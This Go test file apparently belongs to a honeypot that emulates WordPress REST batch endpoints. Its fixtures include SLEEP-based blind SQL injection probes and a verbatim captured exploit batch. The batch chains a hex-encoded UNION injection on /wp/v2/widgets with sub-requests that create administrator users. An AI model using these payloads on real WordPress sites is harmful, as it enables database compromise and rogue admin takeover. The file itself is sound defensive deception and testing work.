// response, so an A/B timing probe against the ResponseMirror plugin actually
// observes a delay on the "true" condition and none on the "false" one. This
// is the call-site half of the time-based oracle; MirrorDelayMs itself
// (internal/plugins/responsemirror_test.go) already covers the math.
func TestHTTP_MirrorTimingDelay(t *testing.T) {
	cmd := parser.Command{
		Name:       "wp/batch",
		StatusCode: 207,
		Handler:    "{}",
		Plugin:     plugins.ResponseMirrorName,
		Mirror: &parser.MirrorConfig{
			RequestKey:  "requests",
			ResponseKey: "responses",
			WrapStatus:  207,
			PathField:   "path",
			MethodField: "method",
			Default:     parser.MirrorElement{Status: 404, Body: `{"code":"x"}`, Headers: `[]`},
			Timing: &parser.MirrorTiming{
				IfRegex:   regexp.MustCompile(`IF(?:%28|\()(.+?)(?:%2C|,)SLEEP(?:%28|\()([0-9]+)`),
				BareRegex: regexp.MustCompile(`SLEEP(?:%28|\()([0-9]+)`),
			},
		},
	}
	servConf := parser.BeelzebubServiceConfiguration{}
	tt := &captureTracer{}

	invoke := func(t *testing.T, body string) time.Duration {
		t.Helper()
		cookieStore := historystore.NewCookieSessionStore(time.Hour)
		defer cookieStore.Stop()
		sctx := &sessionContext{cookieStore: cookieStore, cookieName: ".X", ttlSeconds: 1800}

		req := httptest.NewRequest(http.MethodPost, "/?rest_route=/batch/v1", strings.NewReader(body))
		req.RemoteAddr = "203.0.113.9:1234"
		ctx := context.WithValue(req.Context(), http.LocalAddrContextKey,
			net.Addr(&stubAddr{s: "127.0.0.1:4000"}))
		req = req.WithContext(ctx)

		start := time.Now()
		_, err, _ := buildHTTPResponse(servConf, tt, cmd, req, nil, sctx, nil)
		elapsed := time.Since(start)
		if err != nil {
			t.Fatal(err)
		}
		return elapsed
	}

	treatment := `{"requests":[{"method":"GET","path":"/wp/v2/categories?author_exclude=IF%28%281%3D1%29%2CSLEEP%283%29%2C0%29"}]}`
	control := `{"requests":[{"method":"GET","path":"/wp/v2/categories?author_exclude=IF%28%281%3D0%29%2CSLEEP%283%29%2C0%29"}]}`

	treatElapsed := invoke(t, treatment)
	ctrlElapsed := invoke(t, control)

	if treatElapsed < 2400*time.Millisecond {
		t.Fatalf("treatment should delay ~3s, took %v", treatElapsed)
	}
	if ctrlElapsed > 500*time.Millisecond {
		t.Fatalf("control should be flat, took %v", ctrlElapsed)
	}
}

// TestHTTP_MirrorTimingNoDelayOnReject locks the NEW-1 fidelity fix: a batch
// that trips the whole-envelope method guard is rejected BEFORE dispatch (a
// real WP server validates the method enum first), so it must return the
// reject status instantly — even when the rejected envelope also carries a
// nested literal-true SLEEP(). MirrorDelayMs walks sub-requests independently
// of the reject guard, so without gating the delay on an actual dispatch
// (mirrorStatus == WrapStatus) this would sleep ~3s before serving a 400.
func TestHTTP_MirrorTimingNoDelayOnReject(t *testing.T) {
	cmd := parser.Command{
		Name:       "wp/batch",
		StatusCode: 207,
		Handler:    "{}",
		Plugin:     plugins.ResponseMirrorName,
		Mirror: &parser.MirrorConfig{
			RequestKey:     "requests",
			ResponseKey:    "responses",
			WrapStatus:     207,
			PathField:      "path",
			MethodField:    "method",
			AllowedMethods: []string{"POST", "PUT", "PATCH", "DELETE"},
			Reject:         &parser.MirrorReject{Status: 400, Body: `{"code":"rest_invalid_param"}`},
			Default:        parser.MirrorElement{Status: 404, Body: `{"code":"x"}`, Headers: `[]`},
			Timing: &parser.MirrorTiming{
				IfRegex:   regexp.MustCompile(`IF(?:%28|\()(.+?)(?:%2C|,)SLEEP(?:%28|\()([0-9]+)`),
				BareRegex: regexp.MustCompile(`SLEEP(?:%28|\()([0-9]+)`),
			},
		},
	}
	servConf := parser.BeelzebubServiceConfiguration{}
	tt := &captureTracer{}

	cookieStore := historystore.NewCookieSessionStore(time.Hour)
	defer cookieStore.Stop()
	sctx := &sessionContext{cookieStore: cookieStore, cookieName: ".X", ttlSeconds: 1800}

	// Top-level method GET is not in AllowedMethods -> whole envelope
	// rejected. The nested SLEEP(3) must NOT delay the 400.
	body := `{"requests":[{"method":"GET","path":"/x?author_exclude=IF%28%281%3D1%29%2CSLEEP%283%29%2C0%29"}]}`

	req := httptest.NewRequest(http.MethodPost, "/?rest_route=/batch/v1", strings.NewReader(body))
	req.RemoteAddr = "203.0.113.9:1234"
	ctx := context.WithValue(req.Context(), http.LocalAddrContextKey,
		net.Addr(&stubAddr{s: "127.0.0.1:4000"}))
	req = req.WithContext(ctx)

	start := time.Now()
	resp, err, _ := buildHTTPResponse(servConf, tt, cmd, req, nil, sctx, nil)
	elapsed := time.Since(start)
	if err != nil {
		t.Fatal(err)
	}

	if resp.StatusCode != 400 {
		t.Fatalf("rejected batch should return reject status 400, got %d", resp.StatusCode)
	}
	if elapsed > 500*time.Millisecond {
		t.Fatalf("rejected batch should be instant (pre-dispatch), took %v", elapsed)
	}
}

// ---------------------------------------------------------------------------
// Task 7: MirrorChain wiring — chainStore lookup, sess threaded into the
// mirror plugin, and S4-S6 auth-stage routing.
// ---------------------------------------------------------------------------

// chainEscalationBatchS3Raw is the exact S3 escalation+admin-creation batch
// (a 7-row UNION forge on /wp/v2/widgets carrying the customize_changeset
// marker, plus two POST /wp/v2/users sub-requests), copied verbatim from
// internal/plugins/chain_stages_test.go's escalationBatchS3Raw — see that
// file's comment for provenance (tools/oracle-diff/wordpress-6.9.4/
// chain_capture.jsonl, seq 90). Duplicated rather than shared because it is
// an unexported test fixture in another package; USERNAME_PLACEHOLDER is
// substituted the same way here as there.
const chainEscalationBatchS3Raw = `{"requests": [{"method": "POST", "path": "http://:"}, {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": [{"method": "GET", "path": "http://:"}, {"method": "GET", "path": "/wp/v2/widgets?author_exclude=1%29+AND+1%3D0+UNION+ALL+SELECT+0%2C1%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C0x5b656d6265642077696474683d2235303022206865696768743d22373530225d687474703a2f2f3132372e302e302e313a383039392f68656c6c6f2d776f726c642f23326634333931363735383766315b2f656d6265645d%2C0x74726967676572%2C%27%27%2C0x7075626c697368%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2C0x74726967676572%2C%27%27%2C%27%27%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C0%2C%27%27%2C0%2C0x706f7374%2C%27%27%2C0+UNION+ALL+SELECT+4%2C1%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C0x7b226e61765f6d656e755f6974656d5b313830383337333037385d223a7b2276616c7565223a7b226f626a6563745f6964223a302c226f626a656374223a22222c226d656e755f6974656d5f706172656e74223a302c22706f736974696f6e223a302c2274797065223a22637573746f6d222c227469746c65223a2270726f6f66222c2275726c223a2268747470733a2f2f6769746875622e636f6d2f73657267696f696e74656c2f7770327368656c6c2d706f63222c22746172676574223a22222c22617474725f7469746c65223a22222c226465736372697074696f6e223a2270726f6f66222c22636c6173736573223a22222c2278666e223a22222c22737461747573223a227075626c697368222c226e61765f6d656e755f7465726d5f6964223a302c225f696e76616c6964223a66616c73657d2c2274797065223a226e61765f6d656e755f6974656d222c22757365725f6964223a317d7d%2C0x6368616e6765736574%2C%27%27%2C0x667574757265%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2C0x39306135616537372d303133352d343835352d393762622d393338343561633230366263%2C%27%27%2C%27%27%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C1808373077%2C%27%27%2C0%2C0x637573746f6d697a655f6368616e6765736574%2C%27%27%2C0+UNION+ALL+SELECT+1808373077%2C1%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C0x6f75746572%2C0x6f75746572%2C%27%27%2C0x6472616674%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2C0x6f75746572%2C%27%27%2C%27%27%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C4%2C%27%27%2C0%2C0x706f7374%2C%27%27%2C0+UNION+ALL+SELECT+5%2C1%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C0x6361636865%2C%27%27%2C0x7075626c697368%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2C0x6361636865%2C%27%27%2C%27%27%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C4%2C%27%27%2C0%2C0x706f7374%2C%27%27%2C0+UNION+ALL+SELECT+1808373078%2C1%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C0x6e6176%2C0x6e6176%2C%27%27%2C0x7075626c697368%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2C0x6e6176%2C%27%27%2C%27%27%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C6%2C%27%27%2C0%2C0x6e61765f6d656e755f6974656d%2C%27%27%2C0+UNION+ALL+SELECT+6%2C1%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C0x7061727365%2C0x7061727365%2C%27%27%2C0x7061727365%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2C0x7061727365%2C%27%27%2C%27%27%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C1808373079%2C%27%27%2C0%2C0x72657175657374%2C%27%27%2C0+UNION+ALL+SELECT+1808373079%2C1%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C0x696e6e6572%2C0x696e6e6572%2C%27%27%2C0x6472616674%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2C0x696e6e6572%2C%27%27%2C%27%27%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C%27%27%2C6%2C%27%27%2C0%2C0x706f7374%2C%27%27%2C0+--+-&per_page=-1&orderby=none&context=view"}, {"method": "GET", "path": "/wp/v2/posts"}, {"method": "POST", "path": "/wp/v2/users", "body": {"username": "USERNAME_PLACEHOLDER", "email": "USERNAME_PLACEHOLDER@wp2shell.shellcode.lol", "password": "W2s!FUZ8Lzj93cTy_HKARaVN", "roles": ["administrator"]}}, {"method": "POST", "path": "/wp/v2/users", "body": {"username": "USERNAME_PLACEHOLDER", "email": "USERNAME_PLACEHOLDER@wp2shell.shellcode.lol", "password": "W2s!FUZ8Lzj93cTy_HKARaVN", "roles": ["administrator"]}}]}}, {"method": "POST", "path": "/batch/v1"}]}`

// chainEscalationBatchS3 substitutes an exact, readable username into
// chainEscalationBatchS3Raw.
func chainEscalationBatchS3(username string) string {
	return strings.ReplaceAll(chainEscalationBatchS3Raw, "USERNAME_PLACEHOLDER", username)
}

// chainTestMirrorConfig is a minimal Forge-enabled mirror config (mirrors
// internal/plugins/forge_test.go's forgeOnlyMirror, which is unexported and
// package-scoped so it can't be reused here) — just enough Recurse+Forge
// wiring for the escalation batch's nested envelope + UNION forge to reach
// mirrorArray's admin-creation checkpoint.
func chainTestMirrorConfig() *parser.MirrorConfig {
	return &parser.MirrorConfig{
		RequestKey: "requests", ResponseKey: "responses", WrapStatus: 207,
		PathField: "path", MethodField: "method", MaxItems: 25,
		Recurse: &parser.MirrorRecurse{Status: 207, Headers: `{"Allow":"POST"}`},
		Forge:   &parser.MirrorForge{Collection: "wp_posts"},
		Default: parser.MirrorElement{Status: 404, Body: `{"code":"rest_no_route"}`, Headers: `[]`},
	}
}

// newChainTestRequest builds a request with the given method/target/body,
// stamped with remoteAddr and a stub LocalAddrContextKey so buildHTTPResponse
// (and the SplitHostPort source-key extraction Task 7 added) don't fall over.
func newChainTestRequest(t *testing.T, method, target, body, remoteAddr string) *http.Request {
	t.Helper()
	var r *http.Request
	if body == "" {
		r = httptest.NewRequest(method, target, nil)
	} else {
		r = httptest.NewRequest(method, target, strings.NewReader(body))
	}
	r.RemoteAddr = remoteAddr
	ctx := context.WithValue(r.Context(), http.LocalAddrContextKey,
		net.Addr(&stubAddr{s: "127.0.0.1:4000"}))
	return r.WithContext(ctx)
}

// TestHTTP_ChainWiring_AuthStageRoutesAfterEscalation is the end-to-end lock
// for Task 7: driving the real captured S3 escalation+admin-creation batch
// through buildHTTPResponse's ResponseMirror path with an armed chainStore
// sets adminCreated+username on the per-source-IP session (mirrorArray's
// existing T4 checkpoint logic, now actually reachable because sess is no
// longer hardcoded nil), and a LATER request from the same source IP to
// /wp-admin/users.php is answered by plugins.ServeAuthStage — carrying that
// exact username — instead of the command's configured static/404 handler.
func TestHTTP_ChainWiring_AuthStageRoutesAfterEscalation(t *testing.T) {
	chainStore := plugins.NewChainStore(time.Hour, 100)
	tt := &captureTracer{}
	servConf := parser.BeelzebubServiceConfiguration{}
	const srcIP = "203.0.113.77"

	batchCmd := parser.Command{
		Name: "wp/batch", StatusCode: 207, Handler: "{}",
		Plugin: plugins.ResponseMirrorName,
		Mirror: chainTestMirrorConfig(),
	}
	usersCmd := parser.Command{
		Name: "wp-admin-users", StatusCode: 404,
		Handler: `{"code":"not_found"}`,
	}

	// Step 1: drive the escalation batch through the batch/v1 endpoint —
	// mints the fabricated administrator on the chain session keyed by srcIP.
	batchReq := newChainTestRequest(t, http.MethodPost, "/?rest_route=/batch/v1",
		chainEscalationBatchS3("w2s_integration_test"), srcIP+":1234")
	batchResp, err, _ := buildHTTPResponse(servConf, tt, batchCmd, batchReq, nil, nil, chainStore)
	if err != nil {
		t.Fatal(err)
	}
	if batchResp.StatusCode != 207 {
		t.Fatalf("expected the batch to dispatch (207), got %d: %s", batchResp.StatusCode, batchResp.Body)
	}
	if !strings.Contains(batchResp.Body, `"status":201`) || !strings.Contains(batchResp.Body, "w2s_integration_test") {
		t.Fatalf("escalation batch did not forge the admin-created element: %s", batchResp.Body)
	}

	// Step 2: same source IP (different ephemeral port — RemoteAddr's port
	// is stripped before the chainStore lookup) hits /wp-admin/users.php.
	usersReq := newChainTestRequest(t, http.MethodGet, "/wp-admin/users.php", "", srcIP+":5555")
	usersResp, err2, _ := buildHTTPResponse(servConf, tt, usersCmd, usersReq, nil, nil, chainStore)
	if err2 != nil {
		t.Fatal(err2)
	}
	if usersResp.StatusCode != 200 {
		t.Fatalf("expected ServeAuthStage's 200 for the armed session, got %d", usersResp.StatusCode)
	}
	if !strings.Contains(usersResp.Body, "w2s_integration_test") {
		t.Fatalf("expected users.php body to carry the forged username, got: %s", usersResp.Body)
	}
	if strings.Contains(usersResp.Body, "not_found") {
		t.Fatalf("users.php served the command's static fallback instead of the chain auth-stage response: %s", usersResp.Body)
	}
}

// TestHTTP_ChainWiring_AuthStageRoutesBareWPAdmin locks the http.go dispatch
// switch's coverage of "/wp-admin/" (a bare GET/POST hit, not
// /wp-admin/users.php or /wp-admin/plugin-install.php): ServeAuthStage
// already matches "/wp-admin/" for its S4 login-check stage, but until now
// the HTTP-strategy-side switch in buildHTTPResponse only listed
// /wp-login.php, /wp-admin/users.php and /wp-admin/plugin-install.php, so an
// exploit variant that goes straight to /wp-admin/ for the S4 check fell
// through to the command's ordinary (static/404) response instead of the
// dashboard+Set-Cookie. This is the same escalate-then-hit-a-stage shape as
// TestHTTP_ChainWiring_AuthStageRoutesAfterEscalation, targeting /wp-admin/
// instead of /wp-admin/users.php.
func TestHTTP_ChainWiring_AuthStageRoutesBareWPAdmin(t *testing.T) {
	chainStore := plugins.NewChainStore(time.Hour, 100)
	tt := &captureTracer{}
	servConf := parser.BeelzebubServiceConfiguration{}
	const srcIP = "203.0.113.88"

	batchCmd := parser.Command{
		Name: "wp/batch", StatusCode: 207, Handler: "{}",
		Plugin: plugins.ResponseMirrorName,
		Mirror: chainTestMirrorConfig(),
	}
	wpAdminCmd := parser.Command{
		Name: "wp-admin-root", StatusCode: 404,
		Handler: `{"code":"not_found"}`,
	}

	// Step 1: drive the escalation batch through the batch/v1 endpoint —
	// mints the fabricated administrator on the chain session keyed by srcIP.
	batchReq := newChainTestRequest(t, http.MethodPost, "/?rest_route=/batch/v1",
		chainEscalationBatchS3("w2s_wpadmin_test"), srcIP+":1234")
	batchResp, err, _ := buildHTTPResponse(servConf, tt, batchCmd, batchReq, nil, nil, chainStore)
	if err != nil {
		t.Fatal(err)
	}
	if batchResp.StatusCode != 207 {
		t.Fatalf("expected the batch to dispatch (207), got %d: %s", batchResp.StatusCode, batchResp.Body)
	}
	if !strings.Contains(batchResp.Body, `"status":201`) || !strings.Contains(batchResp.Body, "w2s_wpadmin_test") {
		t.Fatalf("escalation batch did not forge the admin-created element: %s", batchResp.Body)
	}

	// Step 2: same source IP hits bare /wp-admin/ (no trailing page name) —
	// this must route to ServeAuthStage's S4 login stage exactly like
	// /wp-login.php does: 200 + a wordpress_logged_in_* Set-Cookie.
	wpAdminReq := newChainTestRequest(t, http.MethodGet, "/wp-admin/", "", srcIP+":5555")
	wpAdminResp, err2, _ := buildHTTPResponse(servConf, tt, wpAdminCmd, wpAdminReq, nil, nil, chainStore)
	if err2 != nil {
		t.Fatal(err2)
	}
	if wpAdminResp.StatusCode != 200 {
		t.Fatalf("expected ServeAuthStage's 200 for /wp-admin/ on the armed session, got %d", wpAdminResp.StatusCode)
	}
	if strings.Contains(wpAdminResp.Body, "not_found") {
		t.Fatalf("/wp-admin/ served the command's static fallback instead of the chain auth-stage response: %s", wpAdminResp.Body)
	}
	var gotAuthCookie bool
	for _, h := range wpAdminResp.Headers {
		if strings.HasPrefix(h, "Set-Cookie: wordpress_logged_in_") {
			gotAuthCookie = true
			break
		}
	}
	if !gotAuthCookie {
		t.Fatalf("expected a wordpress_logged_in_* Set-Cookie header for /wp-admin/, got headers: %v", wpAdminResp.Headers)
	}
}

// TestHTTP_ChainWiring_FreshSessionFallsThrough is the NOT-handled half of
// Task 7's contract: a chainStore IS armed, but this source IP has never
// driven the forge chain to adminCreated — ServeAuthStage must return
// handled=false and buildHTTPResponse must fall through to the command's
// ordinary configured (here: static 404) response, unchanged.
func TestHTTP_ChainWiring_FreshSessionFallsThrough(t *testing.T) {
	chainStore := plugins.NewChainStore(time.Hour, 100)
	tt := &captureTracer{}
	servConf := parser.BeelzebubServiceConfiguration{}

	usersCmd := parser.Command{
		Name: "wp-admin-users", StatusCode: 404,
		Handler: `{"code":"not_found"}`,
	}
	usersReq := newChainTestRequest(t, http.MethodGet, "/wp-admin/users.php", "", "198.51.100.44:1111")
	resp, err, _ := buildHTTPResponse(servConf, tt, usersCmd, usersReq, nil, nil, chainStore)
	if err != nil {
		t.Fatal(err)
	}
	if resp.StatusCode != 404 || resp.Body != `{"code":"not_found"}` {
		t.Fatalf("expected the command's static fallback for a fresh (not-adminCreated) session, got %d: %s",
			resp.StatusCode, resp.Body)
	}
}

// TestHTTP_ChainWiring_NilChainStoreUnchanged is the zero-regression half:
// chainStore == nil (Chain not configured for this service — the default)
// must leave the S4-S6 auth-stage routing a complete no-op, even for a
// request path the routing switch matches, and even after the same source
// IP has driven the escalation batch (which, with chainStore == nil, is
// impossible to do through this call site in the first place — sess is
// never looked up at all).
func TestHTTP_ChainWiring_NilChainStoreUnchanged(t *testing.T) {
	tt := &captureTracer{}
	servConf := parser.BeelzebubServiceConfiguration{}
	usersCmd := parser.Command{
		Name: "wp-admin-users", StatusCode: 404,
		Handler: `{"code":"not_found"}`,
	}
	usersReq := newChainTestRequest(t, http.MethodGet, "/wp-admin/users.php", "", "203.0.113.77:1234")

	resp, err, _ := buildHTTPResponse(servConf, tt, usersCmd, usersReq, nil, nil, nil /* chainStore */)
	if err != nil {
		t.Fatal(err)
	}
	if resp.StatusCode != 404 || resp.Body != `{"code":"not_found"}` {
		t.Fatalf("chainStore==nil must leave auth-stage routing untouched, got %d: %s", resp.StatusCode, resp.Body)
	}
}

// TestFindMirrorChain locks Init's arming decision: a Command (main or
// fallback) whose Mirror config carries a Chain block is found regardless of
// position; no command with a Chain block returns nil.
func TestFindMirrorChain(t *testing.T) {
	chain := &parser.MirrorChain{Enabled: true, CheckpointTTLSecs: 1800}

	withChainInCommands := parser.BeelzebubServiceConfiguration{
		Commands: []parser.Command{
			{Name: "other", Mirror: &parser.MirrorConfig{}},
			{Name: "wp/batch", Plugin: plugins.ResponseMirrorName, Mirror: &parser.MirrorConfig{Chain: chain}},
		},
	}
	if got := findMirrorChain(withChainInCommands); got != chain {
		t.Fatalf("expected to find the Chain block in Commands, got %v", got)
	}

	withChainInFallback := parser.BeelzebubServiceConfiguration{
		FallbackCommand: parser.Command{Plugin: plugins.ResponseMirrorName, Mirror: &parser.MirrorConfig{Chain: chain}},
	}
	if got := findMirrorChain(withChainInFallback); got != chain {
		t.Fatalf("expected to find the Chain block in FallbackCommand, got %v", got)
	}

	noChain := parser.BeelzebubServiceConfiguration{
		Commands: []parser.Command{
			{Name: "other", Mirror: &parser.MirrorConfig{}},
			{Name: "wp/batch", Plugin: plugins.ResponseMirrorName, Mirror: &parser.MirrorConfig{Forge: &parser.MirrorForge{}}},
		},
	}
	if got := findMirrorChain(noChain); got != nil {
		t.Fatalf("expected nil when no command's mirror has a Chain block, got %v", got)
	}
}
